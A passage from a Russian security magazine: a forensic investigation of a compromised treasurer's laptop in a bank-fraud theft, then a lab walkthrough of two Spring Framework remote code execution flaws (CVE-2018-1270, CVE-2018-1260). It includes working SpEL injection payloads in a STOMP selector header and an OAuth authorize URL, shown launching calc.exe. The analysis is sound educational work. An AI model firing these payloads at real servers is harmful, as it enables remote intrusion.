DumpIt из пакета Comae Memory  Toolkit и подоб ную ей Belkasoft RAM
Capturer. Получен ные .mem‐образы можно будет открыть для парсинга
в Volatility, Rekall, или Belkasoft Evidence Center.
  Первый дамп делаем, используя DumpIt.





             Создание образа RAM в программе DumpIt

Второй дамп RAM мы сделаем в Belkasoft RAM Capturer.





       Создание образа RAM в программе Belkasoft RAM Capturer





  Окно программы создания дампа RAM в программе Belkasoft RAM
  Capturer

Настало вре мя открыть полученный нами дамп RAM в комбай не под названи‐
ем Belkasoft Evidence Center.





    Результат монтирова ния обра за памяти в Belkasoft Evidence Center

Образы HDD‐диска, полученные на самом первом шаге, с легкостью можно
скормить Arsenal Image Mounter.





     Окно мастера монтирования образа HDD в Arsenal Image Mounter





    Список образов, готовых к монтирова нию, в Arsenal Image Mounter





                   Главное окно Arsenal Image Mounter




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             ТАЙНА
     КАЗНАЧЕЙСКОГО
           НОУТБУКА
                      ИСПОЛЬЗУЕМ ФОРЕНЗИКУ,
                   ЧТОБЫ РАСКРЫТЬ ОГРАБЛЕНИЕ





ПОИСК АРТЕФАКТОВ
В самом начале неплохо бы получить некоторую информацию о профиле
пользователя. Сделаем мы это с помощью ForensicUserInfo. Утилита извле‐
кает системную информа цию о RID, сро ке действия учетной записи и смене
пароля; LM/NT‐хеш; количество вхо дов в систему, даты неудачных попыток;
имеющиеся груп пы и путь к про филю пользователя.
   Начнем с самого простого, а имен но глянем список пользовательских
и системных процессов. Самый быстрый способ — это запус тить из CMD
встроенную утилиту tasklist:
 • c:\>tasklist — вывод списка всех процессов в текущем окне;
 • c:\>tasklist /svc — вывод списка всех работающих сервисов в сис‐
   теме;
 • c:\>tasklist > c:\processes_list.txt — вывод данных о процес‐
   сах (сервисах) в текстовый файл с именем processes_list.txt.





                Результат выполнения команды tasklist





  Результат выпол нения команды tasklist с опцией сортировки по сервисам

Еще один неплохой вариант — это любой аль тернативный Task Manager,
к примеру AnVir Task Manager или Process Explorer.





               Вкладка «Процес сы» в AnVir Task Manager





                Вкладка «Сер висы» в AnVir Task Manager





             Просмотр автозаг рузки в AnVir Task Manager

А  теперь  достанем  из  загаш ника  несколько  специально  заточенных
под форензику утилит, входящих в комплект под общим названием Sleuth Kit.
  Для просмотра доступной инфы о памяти набираем команду mmstat.





            Вывод результатов работы ути литы mmstat

Мы знаем тип системного тома, и после исполнения команды mmls она поз‐
волит просмотреть неразмеченные области дис ка:


mmls ‐t dos X:RAM_Img_Forensic.E01





             Вывод результатов работы ути литы mmls

Далее мы можем использовать FileName Layer Tools, позволяющий прос‐
мотреть удаленные фай лы и неразмеченные сегменты.


fls ‐o 1435648 X:RAM_Img_Forensic.E01





              Вывод результатов работы ути литы ﬂs

Что теперь? Создадим некий bodyﬁle — файл‐заготовку с помощью все той
же ﬂs. Это позволит нам выс троить таймлайн активности в системе (англ.
timelines of ﬁle activity). Записываем полученные данные в файл bodyfile.
txt.


fls ‐r ‐m "/" ‐o 1435648 X:RAM_Img_Forensic.E01 > bodyfile.txt





     Записываем полученные данные с помощью ﬂs в файл bodyﬁle.txt

После того как мы создали bodyfile.txt, мы можем заюзать ути литку mac‐
time и выстроить временную шка лу активнос ти (удаления, создания, переиме‐
нования) файлов в системе c экспортом в Excel‐подобный вид:


mactime.pl ‐b bodyfile.txt ‐d > timeline.csv





  Создаем диаграмму времен ной активнос ти (timeline) c помощью
  mactime.pl

Кстати, вот тебе небольшая шпаргалка по используемым утилитам из пакета
Sleuth Kit:
 • mmstat — информация о типе системных томов и таблице разделов диска;
 • mmls — информация о занятом месте, удален ных и allocated файлах;
 • fsstat — информация о ФС, включая серийный номер тома, ID, размер
   кластера, смещение от начала;
 • ﬂs — поиск allocated и удаленных файлов в директории или всем диске;
 • mactime — создание таймлайна активности файловой системы из данных,
   полученных от ﬂs.

Дальше попробуем найти уда ленные файлы или то, что от них еще осталось.
Одна из самых лучших утилит для этого — Autopsy из сбор ника Sleuth Kit.





                    Мастер запус ка Autopsy





   Результаты поиска уда ленных и allocated фай лов в программе Autopsy

Неплохим вариантом будет еще пройтись NirSoft’овской утилитой Shadow‐
CopyView и пошукать остатки файлов, сохранившихся в теневых копиях Win‐
dows.


        WWW

                   В  архивах  «Хакера»  есть  полезная  статейка
                      по теме Shadow Copy.





    Просмотр найденных теневых копий в программе ShadowCopyView





  Просмотр сохраненных слепков в директории /Temp и инфо по точке
  восстановления в окне утилиты ShadowCopyView

Следующим шагом будет анализ системного реестра. В ход пойдут три тул зы
Windows Registry analysis из пакета Magnet AXIOM, RegRipper и Registry Explor‐
er.





            Анализ куста NTUser в программе RegRipper 2.8





        Загрузка основного куста реестра в утилиту Registry Explorer





       Анализ значения клю чей реес тра с помощью Registry Explorer





          Просмотр зна чений MRU в утилите Registry Explorer

Для того чтобы просмотреть удаленный софт, можно ковырнуть файл — базу
данных NTUSER.DAT по пути в системной директории:


NTUSER.DAT\SOFTWARE\Microsoft\UserData\UninstallTimes

А также можно поднять сохраненные URL‐адреса, если юзался старый доб‐
рый ослик IE:


NTUSER.DAT\SOFTWARE\Microsoft\InternetExplorer\TypedURLs

И там же попробовать достать пароли, если пользователь нас троил автосох‐
ранение введенных данных:


NTUSER.DAT\Software\Microsoft\Internet Explorer\IntelliForms

Шпар галка иссле дова теля: инте рес ные мес та реес тра
Список последних используемых файлов (Most Recent Used — MRU) находит‐
ся по пути


 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
 Explorer\RunMRU


Глобальные уникальные идентифика торы  (ID), которые содержат в себе
зашифрованные записи каждого объекта ОС, приложения (программы),
исполняемого exe‐файла, к которо му пользователь обращался в системе,
хранятся в ветке


 HKEY_CURRENT_USER\Software\Mcirosoft\Windows\CurrentVersion\
 Explorer\UserAssist


Список ID и соответству ющего им софта можно глянуть здесь.
  Все когда‐либо ранее подклю чавшиеся к компь ютеру USB‐устрой ства так‐
же отмечаются в ветке реестра


 HKEY_LOCAL_MACHINE\System\ControlSet00x\Enum\USBSTOR


Беспроводные сети (Wi‐Fi SSID), к которым компь ютер когда‐либо подклю‐
чался, будут храниться в ветке


 HKEY_LOCAL_MACHINE\Software\microsoft\WZCSVC\Parameters\Interface


Для тех, кто хочет больше узнать об интерес ных мес тах Windows Registry,
очень хорошо подой дет статья Forensic Analysis Of The Windows Registry.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             ТАЙНА
     КАЗНАЧЕЙСКОГО
           НОУТБУКА
                      ИСПОЛЬЗУЕМ ФОРЕНЗИКУ,
                   ЧТОБЫ РАСКРЫТЬ ОГРАБЛЕНИЕ





Се тевой стек
Для просмотра сетевых подклю чений на скорую руку можно воспользоваться
обычной командой шелла netstat:


netstat ‐a





           Просмотр сетевых подключений командой netstat

Среди всего вывода нас больше всего интересуют следующие статусы:
 • CLOSED — соединение закрыто, сокет не используется;
 • LISTEN (LISTENING) — ожидает входящих соединений;
 • ESTABLISHED — соединение установлено (данные передаются).

И еще дополнительные опции вывода:


// Список соединений TCP
netstat ‐at
// Список соединений UDP
netstat ‐au
// Список всех открытых входящих портов
netstat ‐n





                 Список текущих соединений TCP





               Список всех открытых входящих портов

Аналогичный вывод можно посмотреть и в графичес ком режиме, используя
крохотную утилиту TCPViewer.





          Просмотр сетевых коннектов в прог рамме TCPViewer

Еще одна специальная тулза — NetworkMiner. Помимо фич, которые имеются
у описанных выше программ, в NetworkMiner есть опции извлечения файлов
из протоколов FTP, TFTP, HTTP, POP3, IMAP, экстракт сертификатов X.509 cer‐
tiﬁcates из SSL‐сессий, декапсуляция GRE, 802.1Q, PPPoE, VXLAN, опре деле‐
ние геолокации по IP, экспорт результатов в CSV, Excel, XML, CASE, JSON‐LD.





   Данные по TCP/IP‐стеку, предоставлен ные прог раммой NetworkMiner


Анализируем корзину (Recycle Bin)
Не секрет, что часть данных, побывавших в корзине, все еще можно прос‐
мотреть, даже если файлы были удалены (в терминологии Windows, «корзина
очищена»). Исполь зовать будем  большой  пак под  названием EnCase
Forensic.





              Ин терфейс программы EnCase Forensic

Вот и дошла оче редь до анализа логов (системных журналов). В работе будут
участвовать FullEventLogView от уже извес тной команды разработчиков Nir‐
Soft, а также Magnet AXIOM for computers.





    Главное окно утилиты FullEventLogView для прос мотра логов Windows





        Просмотр системных логов в Magnet AXIOM for computers

Итак, какие события нас будут интересовать в первую очередь:
 • Account Logon — вход в систему под определенной учетной записью;
 • Account Mgmt — изменение учетной записи (перемещение в группу, пере‐
  именование, назначение прав и так далее);
 • Logon Events — вход в учетную запись / выход из нее;
 • Directory Service — присоединение объектов из Active Directory;
 • Object Access — аудит доступа к какому‐либо объекту ОС;
 • Policy Change — изменение политики безопас ности;
 • Privilege Use — выполнение каких‐либо команд от име ни администратора
   или другого привилегированного пользователя;
 • Process Tracking — трекинг событий, свя занных с системны ми процес‐
   сами;
 • System Events — загрузка и завершение работы ОС (в том числе сбои).

Более подробный список событий безопасности с принадлежащими им ID
можно глянуть в хорошей статье на Хаб ре и на страничке проекта GitHub.
  Следующий шаг — это LNK ﬁle analysis, или поиск ярлыков на программы,
которые были установ лены, запущены или поз днее удалены в какой‐то
момент. В работе будем использовать уже знакомый нам пак EnCase
Forensic.





            LNK ﬁle analysis в Magnet AXIOM for computers

Ну и в завершение всех процедур мы еще на вся кий слу чай просканим встро‐
енные в систему поль зовательские App’ы — Skype, OneDrive и Edge, вдруг
найдем там что‐нибудь интерес ное. Для бра узера Edge заюзаем уже извес‐
тный нам Belkasoft Evidence Center. Той же программой кое‐какие данные мы
попытаемся извлечь из файла подкачки Pageﬁle.sys.





      Окно выбора объектов поиска в Belkasoft Evidence Center 2018

Напоследок ко всему перечисленному добавим Skype. Кстати, для скайпа
профиль с полезной для нас информацией хранится в директории


C:\Users\%USERNAME%\AppData\Roaming\Skype\

хотя не помешало бы поискать папку с именем Skype по все му винту, пос‐
кольку мессенджер мог быть уста новлен кас томно или запущен как portable‐
версия.
  Наша тулза Belkasoft Evidence Center извлекает данные из указанного
файла профиля, в том числе SQLite‐листы, нераз меченную область диска,
синхронизированные файлы из чатов, данные из pagefile.sys и hiberfil.
sys. Есть и еще одна замечательная утилита — SkypeLogView от все тех же
ребят из NirSoft.





  Результаты вывода данных из локального про филя Skype утилитой
  SkypeLogView

Несмотря на то что это может показаться детской забавой, в Windows‐сис‐
темах можно извлечь даже историю оповещений из системного  трея.
Информация о нотификации хранится в директории


\Users\%Username%\AppData\Local\Microsoft\Windows\Notifications

Имя базы данных, содержащей исто рию нотификации, может меняться
на каждой машине и зависит от каких‐то внутренних параметров (рас ширение
файла не обязательно будет именно .db). Чтобы ее открыть, понадобится
SQLite manager. Запустив SQLite, нужно найти файлы .db в


C:\Users\Username\AppData\Local\Microsoft\Windows\Notifications

и, просто добавив в менеджер, получить окно встроенного вьюве ра.
   Аналогичная тема с голосо вым помощником Cortana: у нее тоже есть база
данных, хранящая историю, и располага ется она по пути


C:\Users[User]\AppData\Local\Packages\Microsoft.Windows.Cortana_xxxx\
LocalState\ESEDatabase_CortanaCoreInstance\CortanaCoreDb

Несколько слов об OneDrive. Если была включена опция синхронизации (нап‐
ример, с Android‐смартфо ном), то часть фай лов можно найти в гаджете
по пути


/mnt/sdcard/Android/data/com.microsoft.skydrive

Если речь идет про десктопную версию, то логи загрузки/выгрузки, синхро‐
низации и подобных событий можно посмотреть в текстовых документах
по пути


C:\Users\<USERNAME>\AppData\Local\Microsoft\OneDrive\logs


РЕЗУЛЬТАТЫ РАССЛЕДОВАНИЯ
Мы собрали всю доступную информацию, и что же в сухом остатке?
  Среди прочих файлов в Shadow Copy мы нашли неизвестный исполня‐
емый файл, который, как потом выяс нилось, представлял собой код мал вари,
заточенной под кражу логинов/паролей, набранных с клавиатуры символов,
буфера обмена, файлов coockie. Причем файл этот никак не детектится уста‐
новленным AV. Также было замечено, что во внешний мир на несколько IP‐
адресов серверов, расположенных в Западной Европе, висят установленные
соединения, не типичные для софта, инстал лированного на пациенте.
По логам системы ДБО было отмечено, что логин в систему происходил
в обеденное время, когда казначей, которому принадлежит данный ноутбук,
отсутствовал  в офисе и не мог произвести  эти операции. Большой
оплошностью специалис та было оставлять USB‐клю чи с ЭП вставленны ми
постоянно в порт компьютера.
  В сотрудничестве с антивирус ными ана литиками нам удалось восста‐
новить весьма вероятный сценарий взло ма.
   Итак, ноутбук за неделю до инцидента передавали в службу под держки
для установки ПО и оптимиза ции производитель нос ти. Именно тогда на кли‐
ента был закинут вредонос ный код, который про писал себя в автозагрузку.
В течение недели мал варь собира ла все данные, вводимые с клавиатуры,
сделала дамп  реестра,  анализирова ла  часы  активности  пользователя
и передала все это на управляющий сервер злоумышленника. Далее мал варь
отработала как дроппер: подтянула из сети компоненты бэкдора (что поз‐
волило установить защищен ный канал уда лен ной связи к компьютеру жер‐
твы), предположительно использовав инкапсу ляцию в DNS‐протокол.
  В день Х, когда сотрудник отпра вился на обед, хакер подключился к инфи‐
цированной машине, залогинился в ДБО, используя подключенные ЭП‐ключи
на USB‐токене, провел финансовые транзакции и замел сле ды: удалил
из системы малварь, модули бэкдора, зачистил %TEMP%, часть security и поль‐
зовательских логов, на которые хва тило полномочий.
  Ввиду «инертности системы бухгалтер ско го учета» (всем, кто работает
с бухгалтерией, рекомен дуем взять этот эвфемизм на вооружение.  :) —
Прим. ред.) корпоративная служ ба безопас ности узна ла об инциденте только
через два дня, когда зло умышленник уже успел обналичить переве денные
средства. Однако артефакты, оставши еся на выключенном ноутбуке, хоть
и не вернули деньги, но все‐таки позволили восста новить картину происхо‐
дящего.


ЗАКЛЮЧЕНИЕ
Наш разбор сегодняшнего большого кейса подошел к концу. Ты на практике
познакомился с использованием основных форензик‐ути лит, благодаря чему
в случае взлома сможешь самостоятельно пройтись по ключевым «чекам»,
собрать арте факты и на осно вании этих сведений восстановить сце нарий
взлома. Если прибавить к этому парсинг малвари и бэкдора, которые исполь‐
зовались для несанкционированного подключения и кражи данных учетной
записи от ДБО, то вуаля, мы вплотную подошли к локализации злоумыш‐
ленника! Теперь ты зна ешь, как работают нас тоящие форензик‐эксперты
и каким трудом по крупицам они собира ют бесценную информацию.
ВЗЛОМ
     ВЕСЕННЕЕ
   ОБОСТРЕНИЕ

                        КАК РАБОТАЮТ
        ДВЕ КРИТИЧЕСКИЕ УЯЗВИМОСТИ
                В SPRING FRAMEWORK





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Spring — это популярнейший фреймворк для раз работки на Java, на нем
базируются сот ни решений в самых разных областях. Тут и все возможные
веб‐сайты, и энтер прайз‐сервисы, и много другого. Труд но най ти серьезное
приложение на Java, которое бы не использовало Spring. Недавно в нем были
найдены две критические  уяз вимос ти, которые приводят  к удаленному
исполнению кода. Давай посмотрим, как они работают.
  Первая  уязвимость  (CVE‐2018‐1270)  каса ется  модуля  для  работы
с веб‐сокетами, вторая (CVE‐2018‐1260) — модуля авторизации по протоколу
OAuth2. Но прежде чем раз бирать их, подготовим стенд для тес тирования.


СТЕНД
Снова мои любимые стенды для Java, да еще и с модулями фреймворка,
о чем еще можно мечтать? :‐)
  В работе нам понадобят ся:
 • любая опе рационка;
 • Docker;
 • Java 8;
 • Maven или другая Ant‐подобная тулза для билда;
 • в идеале какая‐нибудь IDE, но и обычный текстовый редактор сойдет.

Как ты уже понял, для каждой уяз вимос ти нужно будет скачивать, компилиро‐
вать и запускать приложения, написанные на Java. Компиляция и запуск
в общем случае будут сво диться к паре команд.


$ mvn package
$ java ‐jar target\package.jar

Если воспользуешься IDE, то процесс будет более наглядным. Я для своей
работы возь му IntelliJ IDEA. Все остальные манипуляции рассмотрим по ходу
разбора уязвимостей. Погнали!


RCE В МОДУЛЕ SPRING-MESSAGING (CVE-2018-1270)
Первый баг в списке — это удаленное выполнение команд в модуле spring‐
messaging, который входит в стандартную поставку Spring Framework. Уяз‐
вимость, найденная 5 апреля, получила идентифика тор CVE‐2018‐1270 и име‐
ет  статус  критической.  Она  зат рагивает  все  версии  фреймворка
из веток 4 и 5, вплоть до актуальных 4.3.14 и 5.0.4. Проблема заключается
в некорректной логике обработки STOMP‐сооб щений (Simple/Streaming Text
Oriented Message Protocol) и легко эксплуатируется удаленно.
  STOMP — это специально спроектированный протокол обмена сообщени‐
ями. Он прост и основан на фреймах, подобно HTTP. Фрейм состоит
из команды, необязательных заголовков и необя зательного тела. Благодаря
своей простоте STOMP может быть реализован поверх большого количества
других протоколов, таких как RabbitMQ, ActiveMQ и других. Также можно
успешно организовать работу поверх WebSockets. Именно этот способ нам
интересен в рам ках уяз вимос ти, так как проб лема находится в модуле spring‐
messaging, в реализации протокола STOMP.
  Для тестирования уязвимос ти нам потребуется скачать примеры исполь‐
зования STOMP из репозитория https://github.com/spring‐guides/gs‐messag‐
ing‐stomp‐websocket. Подой дет любой коммит до 5 апреля.





     Коммиты в репозитории с примера ми работы протокола STOMP


$ git clone https://github.com/spring‐guides/gs‐messag
ing‐stomp‐websocket
$ cd gs‐messaging‐stomp‐websocket
$ git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3

Теперь заглянем в папку, где хра нится фронтенд. Нас интересует файл
app.js , а в нем — функция, которая отвечает за подключение клиента к сер‐
веру. Для этих целей здесь используется биб лиотека SockJS.


/gs-messaging-stomp-
websocket/complete/src/main/resources/static/app.js
15: function connect() {
16:     var socket = new SockJS('/gs‐guide‐websocket');
17:     stompClient = Stomp.over(socket);
18:     stompClient.connect({}, function (frame) {
19:         setConnected(true);
20:         console.log('Connected: ' + frame);
21:         stompClient.subscribe('/topic/greetings', function (
greeting) {
22:             showGreeting(JSON.parse(greeting.body).content);
23:         });
24:     });
25: }

Нам нужно добавить переменную с пейлоадом, которая будет отправляться
в качестве заголовка selector при соз дании подключения. Для облегче ния
эксплуатации можно сделать это до компиляции.


15: function connect() {
16:     var header = {"selector":"T(java.lang.Runtime).getRuntime().
exec('calc.exe')"};
17:     var socket = new SockJS('/gs‐guide‐websocket');
18:     stompClient = Stomp.over(socket);
19:     stompClient.connect({}, function (frame) {
20:         setConnected(true);
21:         console.log('Connected: ' + frame);
22:         stompClient.subscribe('/topic/greetings', function (
greeting) {
23:             showGreeting(JSON.parse(greeting.body).content);
24:         }, header);
25:     });
26: }

После этого можно откомпилировать и запустить приложение.


$ cd complete
$ mvn package
$ java ‐jar target/gs‐messaging‐stomp‐websocket‐0.1.0.jar





          Запущен ное приложение для тестирования STOMP

Согласно спецификации протоко ла STOMP переданные в хидере selector
данные будут исполь зоваться для фильтрации информации о подписках.
  В файле DefaultSubscriptionRegistry.java имеется функция, которая
отрабатывает при создании нового подключения, где генери руется новая
подписка на события для это го клиента.


/org/springframework/messaging/simp/broker/DefaultSubscription-
Registry.java
139: @Override
140: protected void addSubscriptionInternal(
141:         String sessionId, String subsId, String destination,
Message<?> message) {
142:
143:     Expression expression = null;
144:     MessageHeaders headers = message.getHeaders();
145:     String selector = SimpMessageHeaderAccessor.getFirstNativeH
eader(getSelectorHeaderName(), headers);
...
160:     this.subscriptionRegistry.addSubscription(sessionId, subsId,
 destination, expression);
161:     this.destinationCache.updateAfterNewSubscription(destination
, sessionId, subsId);

А если встре чается хидер selector, то его содержимое интерпретируется
как выражение на языке SpEL (Spring Expression Language). За его обработку
отвечает функция doParseExpression класса SpelExpression.


/org/springframework/expression/spel/standard/InternalSpelExpres-
sionParser.java
121: @Override
122: protected SpelExpression doParseExpression(String expres
sionString, @Nullable ParserContext context)
123:         throws ParseException {
124:
125:     try {
126:         this.expressionString = expressionString;
127:         Tokenizer tokenizer = new Tokenizer(expressionString);
128:         this.tokenStream = tokenizer.process();
129:         this.tokenStreamLength = this.tokenStream.size();
130:         this.tokenStreamPointer = 0;
131:         this.constructedNodes.clear();
132:         SpelNodeImpl ast = eatExpression();
133:         Assert.state(ast != null, "No node");





       Обработка заголовка selector при соз дании соеди нения

Здесь есть возможность вызова конструктора java.lang.Class при помощи
модификатора T.





             Парсинг выражения, переданного в selector

Это значит, что мы довольно просто можем соз дать экземпляр объекта java.
lang.Runtime и выполнить произвольную команду при помощи метода exec.





       Обработанное выражение на SpEL, переданное в selector

Теперь, после того как селектор привязан к сооб щениям, на которые под‐
писан пользователь, можно про должать общение с сервером, чтобы начать
получать эти самые сообщения. Для этого в примере предус мотрен стандар‐
тный Hello, %username%.
   Когда гость отправит имя с помощью соответствующей формы, сервер
должен его поп риветствовать. То есть он должен выслать ответ всем поль‐
зователям, которые подписаны на это событие. Этим занимается функция
sendMessageToSubscribers, в которой выполняется метод findSubscrip‐
tions. Он находит всех адресатов, которые были подписаны на сообщения
этого типа.


/org/springframework/messaging/simp/broker/SimpleBrokerMes-
sageHandler.java
349: protected void sendMessageToSubscribers(@Nullable String destin
ation, Message<?> message) {
350:     MultiValueMap<String,String> subscriptions = this.subscr
iptionRegistry.findSubscriptions(message);
351:     if (!subscriptions.isEmpty() && logger.isDebugEnabled()) {
352:         logger.debug("Broadcasting to " + subscriptions.size() +
 " sessions.");
353:     }

Далее попадаем в метод findSubscriptionsInternal. Внутри него про‐
исходит вызов filterSubscriptions.


/org/springframework/messaging/simp/broker/DefaultSubscription-
Registry.java
183: @Override
184: protected MultiValueMap<String, String> findSubscriptio
nsInternal(String destination, Message<?> message) {
185:     MultiValueMap<String, String> result = this.destinationCache
.getSubscriptions(destination, message);
186:     return filterSubscriptions(result, message);
187: }
188:
189: private MultiValueMap<String, String> filterSubscriptions(
190:         MultiValueMap<String, String> allMatches, Message<?>
message) {
191:
...
207:             Expression expression = sub.getSelectorExpression();

Этот метод выпол няет выборку всех переданных ранее правил, чтобы затем
на  их основе выполнить филь тра цию сообщения.  Тут  же, разумеется,
находится и наш экспрешн.





            Найденные филь тры для текущего сообщения

Дальше за дело берется обработчик выражений SpEL, вызывается метод
getValueInternal. В него переда ется контекст, в котором будет выполнять‐
ся наше выражение, и его атрибуты.


/org/springframework/expression/spel/ast/MethodReference.java
84: @Override
85: public TypedValue getValueInternal(ExpressionState state) throws
EvaluationException {
86:     EvaluationContext evaluationContext = state.getEvaluationCo
ntext();
87:     Object value = state.getActiveContextObject().getValue();
88:     TypeDescriptor targetType = state.getActiveContextObject().
getTypeDescriptor();
89:     Object[] arguments = getArguments(state);
90:     TypedValue result = getValueInternal(evaluationContext, value
, targetType, arguments);
91:     updateExitTypeDescriptor();
92:     return result;
93: }

Так как мы исполь зуем экземпляр класса java.lang.Runtime, именно он
и будет вызван через обертку MethodExecutor.


/org/springframework/expression/spel/ast/MethodReference.java
095: private TypedValue getValueInternal(EvaluationContext evalua
tionContext,
096:         @Nullable Object value, @Nullable TypeDescriptor target
Type, Object[] arguments) {
...
104:     MethodExecutor executorToUse = getCachedExecutor(evalua
tionContext, value, targetType, argumentTypes);
105:     if (executorToUse != null) {
106:         try {
107:             return executorToUse.execute(evaluationContext,
value, arguments);





    Вызов переданного пейлоада с помощью ReﬂectiveMethodExecutor

Затем вызывается метод execute, и мы наб люда ем открывшееся окошко
калькулятора.


/org/springframework/expression/spel/support/ReflectiveMethodEx-
ecutor.java
110: @Override
111: public TypedValue execute(EvaluationContext context, Object
target, Object... arguments) throws AccessException {
112:     try {
113:         this.argumentConversionOccurred = ReflectionHelper.
convertArguments(
114:                 context.getTypeConverter(), arguments, this.
method, this.varargsPosition);
115:         if (this.method.isVarArgs()) {
116:             arguments = ReflectionHelper.setupArgumentsF
orVarargsInvocation(
117:                     this.method.getParameterTypes(), arguments);
118:         }
119:         ReflectionUtils.makeAccessible(this.method);
120:         Object value = this.method.invoke(target, arguments);
121:         return new TypedValue(value, new TypeDescriptor(new
MethodParameter(this.method, ‐1)).narrow(value));





           Успешная эксплуата ция уяз вимос ти CVE‐2018‐1270

С этим багом, пожалуй, все. Переходим к следующему.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          ВЕСЕННЕЕ
        ОБОСТРЕНИЕ
                                   КАК РАБОТАЮТ
                  ДВЕ КРИТИЧЕСКИЕ УЯЗВИМОСТИ
                         В SPRING FRAMEWORK





RCE В МОДУЛЕ OAUTH-АВТОРИЗАЦИИ SPRING-SECURITY-OAUTH2
(CVE-2018-1260)
Думаю, никому не нужно объяснять, что за зверь такой протокол авторизации
OAuth. В интернете куча статей, которые сделают это на порядок лучше и под‐
робнее, чем я. Так что сра зу перей дем к конкретной реализации OAuth
во фреймворке Spring. Для этих целей имеется модуль spring‐security‐
oauth2.
   Рассматриваемая уязвимость затрагивает следующие его версии:
 • 2.3 до 2.3.3;
 • 2.2 до 2.2.2;
 • 2.1 до 2.1.2;
 • 2.0 до 2.0.15.

Атакующий при помощи специально сформированного запроса к точке авто‐
ризации может заставить систему выполнить произвольный код пос ле
успешного  входа  и  перенаправления  на  точку  его  под твержде ния.
Для успешной эксплуатации уязвимое приложение дол жно соответствовать
некоторым требованиям:
 • работать     в     роли     сервера     авторизации     (например,
   @EnableAuthorizationServer);
 • не иметь ограничения области видимос ти (по дефол ту именно так);
 • использовать дефол тную точку подтверждения авторизованных поль‐
   зователей.

Давай создадим эти условия. Для тес товых целей позаимс твуем у наших
китайских коллег пример приложения, которое использует авторизацию
по протоколу OAuth2.


$ git clone https://github.com/wanghongfei/
spring‐security‐oauth2‐example.git

Теперь нужно настроить авториза цию. Для этого заг лянем в метод configure
из файла OAuthSecurityConfig.java и раскомментируем строки, чтобы
получилось следующее.


/src/main/java/cn/com/sina/alan/oauth/config/OAuthSecurityConfig.-
java
67: @Override
68: public void configure(ClientDetailsServiceConfigurer clients)
throws Exception {
69:     // clients.withClientDetails(clientDetails());
70:     clients.inMemory()
71:             .withClient("client")
72:             .authorizedGrantTypes("authorization_code")
73:             .scopes();
74: }

Затем нужно создать структуру таблиц в базе данных MySQL согласно пред‐
ставленной на странице репозитория схеме и ука зать наши данные для под‐
клю чения к серверу в файле application.properties. В качестве сервера
MySQL я подниму контейнер Docker.


$ docker run ‐p3306:3306 ‐e MYSQL_USER="oauth" ‐e MYSQL_
PASSWORD="TPH9YQ8lJV" ‐e MYSQL_DATABASE="alan‐oauth" ‐d ‐‐rm
‐‐name=mysql ‐‐hostname=mysql mysql/mysql‐server
$ docker exec ‐ti mysql /bin/bash
$ mysql ‐u oauth ‐D "alan‐oauth" ‐‐password="TPH9YQ8lJV"


/src/main/resources/application.properties
07: spring.datasource.url=jdbc:mysql://192.168.99.100:3306/
alan‐oauth?characterEncoding=UTF‐8
08: spring.datasource.username=oauth
09: spring.datasource.password=TPH9YQ8lJV
10: spring.datasource.driver‐class‐name=com.mysql.jdbc.Driver

После этого запускаем скомпилиро ванное приложение и видим форму авто‐
ризации.





      Запущенное приложение — пример авторизации через OAuth

Давай сразу к экспло иту. Переходим по адресу


http://127.0.0.1:8080/oauth/authorize?client_id=client&respon
se_type=code&redirect_uri=http://www.github.com/&
scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.
exe%22%29%7D

Нас снова перебросит на форму авто ризации, в которой можно указать
любой логин и пароль. Нажимаем «Войти» и наблюдаем запущенный каль‐
кулятор.





  Успешная эксплуатация модуля OAuth‐авториза ции
  spring‐security‐oauth2

Что же это за волшебная ссылка? Обра ти внимание на ее параметры. redi‐
rect_uri указывает на сервис, с помощью которого мы якобы будем авто‐
ризовываться,  а  вот  параметр  области  видимости   (scope)  содержит
любопытную строку:


${T(java.lang.Runtime).getRuntime().exec("calc.exe")}

Так‐так. Ничего не напоминает? Это то же самое выраже ние на язы ке Spring
Expression Language (SpEL), что мы использовали при эксплу атации предыду‐
щей уязвимости.
   Когда ты переходишь по ссылке, в текущей сессии сохраняются передан‐
ные настройки для даль нейшей авторизации. Пос ле нажатия кнопки Login
отрабатывает метод authorize.


/org/springframework/security/oauth2/provider/endpoint/Authoriza-
tionEndpoint.java
116: @RequestMapping(value = "/oauth/authorize")
117: public ModelAndView authorize(Map<String, Object> model, @Reques
tParam Map<String, String> parameters,
118:         SessionStatus sessionStatus, Principal principal) {
...
123:     AuthorizationRequest authorizationRequest = getOAuth2Reques
tFactory().createAuthorizationRequest(parameters);

Этот метод фор мирует зап рос на сервер авто риза ции для получе ния ключа
текущего пользователя. Данные, которые мы ука зали, передаются в перемен‐
ной parameters.





           Отладка формирования зап роса на авторизацию

В результате будет соз дан экземпляр клас са AuthorizationRequest. Даль‐
ше по коду начинается проверка его атрибута scope при помощи vali‐
dateScope.


/org/springframework/security/oauth2/provider/endpoint/Authoriza-
tionEndpoint.java
135: try {
136:
137:     if (!(principal instanceof Authentication) || !((Authen
tication) principal).isAuthenticated()) {
138:         throw new InsufficientAuthenticationException(
139:                 "User must be authenticated with Spring
Security before authorization can be completed.");
140:     }
...
156:      oauth2RequestValidator.validateScope(authorizationRequest,
client);


/org/springframework/security/oauth2/provider/request/DefaultOAu-
th2RequestValidator.java
17: public class DefaultOAuth2RequestValidator implements OAuth2
RequestValidator {
18:
19:     public void validateScope(AuthorizationRequest author
izationRequest, ClientDetails client) throws InvalidScopeException {
20:         validateScope(authorizationRequest.getScope(), client.
getScope());
21:     }


/org/springframework/security/oauth2/provider/request/DefaultOAu-
th2RequestValidator.java
27: private void validateScope(Set<String> requestScopes, Set<String>
 clientScopes) {

Тут происходит сравнение данных, переданных  в scope,  с  указанной
областью видимости по умолчанию в настройках в самом начале. Так как мы
не передали никакие параметры в метод scopes(), то клиенту разрешено
использовать любой. Официальная документация сообщает нам, что такое
поведение используется по умолчанию.





          Раздел документации о параметрах настройки клиента

Если же области видимос ти не совпада ют с ука занной, то приложе ние воз‐
вращает исключение.


/org/springframework/security/oauth2/provider/request/DefaultOAu-
th2RequestValidator.java
29: if (clientScopes != null && !clientScopes.isEmpty()) {
30:     for (String scope : requestScopes) {
